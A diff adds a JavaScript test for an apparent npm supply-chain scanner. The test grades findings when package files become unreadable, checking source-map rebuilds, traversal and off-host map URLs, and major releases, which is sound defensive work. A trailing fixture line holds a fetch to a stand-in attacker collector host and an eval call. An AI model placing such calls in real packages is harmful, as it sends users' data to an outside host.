@@ -192,6 +192,66 @@ test('whether each new dependency is the caller\'s own is asked four at a time, 
   assert.equal(asked.filter(url => url.startsWith('https://api.npmjs.org/downloads/range/') && /s\d+(?:%2F|\/)p$/iu.test(url)).length, 100, 'a hundred told, as before')
 })
 
+test('a file become unreadable calls for less where its source map was rebuilt with it, or in a major release, as a publisher changed does', () => {
+  const side = (at, files, manifest = {}) => ({ kind: 'sourcemap', npm: { name: 'built', version: at, manifest },
+    json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
+  const short = 'a\n'.repeat(10)
+  const long = name => `${'x'.repeat(3000)}\n//# sourceMappingURL=${name}.map\n`
+  const found = (base, other) => Object.fromEntries(npmCompareFindings(base, other, { added: [], changed: [] })
+    .filter(({ id }) => id === 'now-unreadable' || id === 'publisher').map(({ id, ...finding }) => [id, finding]))
+  const map = mappings => JSON.stringify({ version: 3, mappings })
+  const edited = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': map('A') }))
+  assert.equal(edited['now-unreadable'].severity, 'critical', 'its map as it was')
+  const rebuilt = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': map('B') }))
+  assert.equal(rebuilt['now-unreadable'].severity, 'high')
+  assert.deepEqual(rebuilt['now-unreadable'].files.map(row => row.rebuilt), [true])
+  assert.equal(found(side('1.0.0', { 'a.css': short, 'a.css.map': map('A') }), side('1.0.1', { 'a.css': `${'x'.repeat(3000)}\n/*# sourceMappingURL=a.css.map */\n`, 'a.css.map': map('B') }))['now-unreadable']?.severity,
+    'high', 'its map named in a block comment')
+  const indexed = sections => JSON.stringify({ version: 3, sections: [{ offset: { line: 0, column: 0 }, map: JSON.parse(map(sections)) }] })
+  assert.equal(found(side('1.0.0', { 'a.js': short, 'a.js.map': indexed('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': indexed('B') }))['now-unreadable'].severity,
+    'high', 'an indexed map rebuilt')
+  assert.equal(found(side('1.0.0', { 'a.js': short, 'a.js.map': indexed('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': '{"version":3,"sections":[null]}' }))['now-unreadable'].severity,
+    'critical', 'an indexed map whose sections are none')
+  const elsewhere = found(side('1.0.0', { 'lib/a.js': short, 'lib/a.js.map': map('A'), 'maps/a.map': map('A') }),
+    side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=../maps/a.map\n`, 'lib/a.js.map': map('B'), 'maps/a.map': map('A') }))
+  assert.equal(elsewhere['now-unreadable'].severity, 'critical', 'the map it names as it was, whatever map beside it changed')
+  const named = found(side('1.0.0', { 'lib/a.js': short, 'maps/a.map': map('A') }),
+    side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=../maps/a.map\n`, 'maps/a.map': map('B') }))
+  assert.equal(named['now-unreadable'].severity, 'high', 'the map it names, by a path from its own, rebuilt')
+  const inline = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A') }),
+    side('1.0.1', { 'a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=data:application/json;base64,e30=\n`, 'a.js.map': map('B') }))
+  assert.equal(inline['now-unreadable'].severity, 'critical', 'a map inline is no map rebuilt beside it')
+  for (const name of ['/a.js.map', '//cdn.example/a.js.map', '\\\\cdn.example/a.js.map', '/package/lib/a.js.map', 'https://package.invalid/package/lib/a.js.map', 'https://one.invalid/one/lib/a.js.map', '//two.invalid/two/lib/a.js.map', '/one/lib/a.js.map', 'cdn.example%2Fa.js.map', 'a.js.map*elsewhere', 'a.js.map#x']) {
+    const rooted = found(side('1.0.0', { 'lib/a.js': short, 'lib/a.js.map': map('A'), 'lib/cdn.example/a.js.map': map('A') }),
+      side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=${name}\n`, 'lib/a.js.map': map('B'), 'lib/cdn.example/a.js.map': map('B') }))
+    assert.equal(rooted['now-unreadable'].severity, 'critical', `${name}: a map from a site's root or another host is none beside it`)
+  }
+  for (const [path, name] of [['a.js', '../a.js.map'], ['lib/a.js', '../../a.js.map'], ['lib/a.js', '%2e%2e/%2E%2e/a.js.map']]) {
+    const above = found(side('1.0.0', { [path]: short, 'a.js.map': map('A') }),
+      side('1.0.1', { [path]: `${'x'.repeat(3000)}\n//# sourceMappingURL=${name}\n`, 'a.js.map': map('B') }))
+    assert.equal(above['now-unreadable'].severity, 'critical', `${path} naming ${name}: a map above the package is none of its own`)
+  }
+  const encoded = found(side('1.0.0', { 'lib/a.js': short, 'a.js.map': map('A'), 'lib/%2e%2e/a.js.map': map('A') }),
+    side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=%2e%2e/a.js.map\n`, 'a.js.map': map('A'), 'lib/%2e%2e/a.js.map': map('B') }))
+  assert.equal(encoded['now-unreadable'].severity, 'critical', 'the map an encoded `..` names, as a browser resolves it, as it was')
+  const text = 'module.exports = function long() { return 42 }\n'.repeat(40)
+  const grown = `${text}${'x'.repeat(3000)}\n//# sourceMappingURL=a.js.map\n`
+  const renamed = (was, now) => found(side('1.0.0', { 'src/a.js': text, ...was }), side('1.0.1', { 'dist/a.js': grown, ...now }))['now-unreadable'].severity
+  assert.deepEqual([renamed({ 'dist/a.js.map': map('A') }, { 'dist/a.js.map': map('A') }), renamed({ 'src/a.js.map': map('A') }, { 'dist/a.js.map': map('A') }),
+    renamed({ 'src/a.js.map': map('A') }, { 'dist/a.js.map': map('B') })], ['critical', 'critical', 'high'], 'renamed: the map where it lands as it was, or moved with it as it was; rebuilt')
+  const manifest = found(side('1.0.0', { 'a.js': short, 'package.json': '{"version":"1.0.0"}' }),
+    side('1.0.1', { 'a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=package.json\n`, 'package.json': '{"version":"1.0.1"}' }))
+  assert.equal(manifest['now-unreadable'].severity, 'critical', 'a file it names that is no source map, changed as it may be')
+  const fake = found(side('1.0.0', { 'a.js': short, 'a.js.map': 'x' }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': 'y' }))
+  assert.equal(fake['now-unreadable'].severity, 'critical', 'a .map that is no source map')
+  const mixed = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A'), 'b.js': short }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': map('B'), 'b.js': long('b.js') }))
+  assert.equal(mixed['now-unreadable'].severity, 'critical', 'one file of them unexplained')
+  const major = found(side('1.4.1', { 'a.js': short }, { publisher: 'known', knownAccounts: ['known'] }), side('2.0.0', { 'a.js': long('a.js') }, { publisher: 'new' }))
+  assert.deepEqual([major['now-unreadable'].severity, major['now-unreadable'].major, major.publisher.severity, major.publisher.major], ['high', true, 'high', true])
+  assert.equal(found(side('0.1.5', { 'a.js': short }), side('0.2.0', { 'a.js': long('a.js') }))['now-unreadable'].severity, 'high', '0.x: its minor is its major')
+  assert.equal(found(side('1.4.1', { 'a.js': short }), side('1.5.0', { 'a.js': long('a.js') }))['now-unreadable'].severity, 'critical', 'a minor release')
+})
+
 test('what is read is kept by type, and an assessment kept needs no tarball', async t => {
   const files = { 'package.json': '{}', 'index.js': 'eval(x)\n' }
   const asked = npm(t, [{ name: 'kept', versions: [version('kept', '1.0.0', files, { dependencies: {} }, ago(400)), version('kept', '1.1.0', { ...files, 'more.js': 'fetch("https://collector.attacker.dev/x")' }, { dependencies: {} }, ago(300))] }],
